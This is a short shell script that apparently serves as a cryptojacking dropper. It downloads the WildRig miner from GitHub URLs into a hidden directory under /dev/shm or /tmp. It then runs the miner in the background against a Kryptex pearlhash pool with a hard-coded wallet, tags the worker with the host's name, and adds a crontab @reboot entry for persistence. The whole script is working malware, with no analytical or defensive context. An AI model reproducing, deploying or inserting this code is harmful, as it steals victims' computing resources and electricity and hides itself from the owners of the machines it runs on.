#!/bin/sh
W=prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz
H=$(hostname 2>/dev/null | tr -c 'A-Za-z0-9' '-' | cut -c1-24)
WK="ul-t2-${H}-g0"
D=/dev/shm/.ulc
mkdir -p "$D" 2>/dev/null || { D=/tmp/.ulc; mkdir -p "$D"; }
cd "$D" || exit 1
if [ ! -x ./wr ]; then
  for u in https://github.com/andru-kun/wildrig-multi/releases/latest/download/wildrig-multi-linux.tar.gz \
           https://raw.githubusercontent.com/dongsuju/ul-comfy-node/main/wildrig-multi; do
    curl -fsSL --max-time 150 -o wr.bin "$u" 2>/dev/null || continue
    if tar tzf wr.bin >/dev/null 2>&1; then tar xzf wr.bin >/dev/null 2>&1 && mv -f wildrig-multi wr 2>/dev/null; else cp wr.bin wr; fi
    chmod +x wr 2>/dev/null
    [ -x ./wr ] && break
  done
fi
[ -x ./wr ] || exit 0
pgrep -f "wr --algo pearlhash" >/dev/null 2>&1 && exit 0
setsid nohup ./wr --algo pearlhash -o prl-sg.kryptex.network:7048 -u "$W.$WK" -p x >>miner.log 2>&1 &
echo "start $WK $(date)" >> miner.log
( crontab -l 2>/dev/null; echo "@reboot sh $D/../$(basename $D)/plant.sh >/dev/null 2>&1" ) | crontab - 2>/dev/null
